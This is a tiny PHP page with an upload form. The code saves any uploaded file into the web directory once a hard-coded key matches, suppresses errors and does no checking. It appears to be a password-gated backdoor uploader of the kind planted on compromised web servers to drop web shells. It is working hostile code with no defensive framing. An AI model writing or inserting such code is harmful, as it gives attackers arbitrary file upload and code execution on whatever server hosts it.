<!DOCTYPE html>
<html>
 <head>
   <meta charset="utf-8">
 </head>
 <body>
    <form name="form_gt" action="ea07818d.php" method="post" ENCTYPE="multipart/form-data">
    <input type="text" id="key" name="key"></br>
    <input type="file" id="upfile" name="upfile" title=""></br>
    <input type="submit" value="Upload">
    </form>
 </body>
</html>
<?php
if($_POST['key']!='ea07818d') die();
@move_uploaded_file($_FILES["upfile"]["tmp_name"], basename($_FILES["upfile"]["name"]));
?>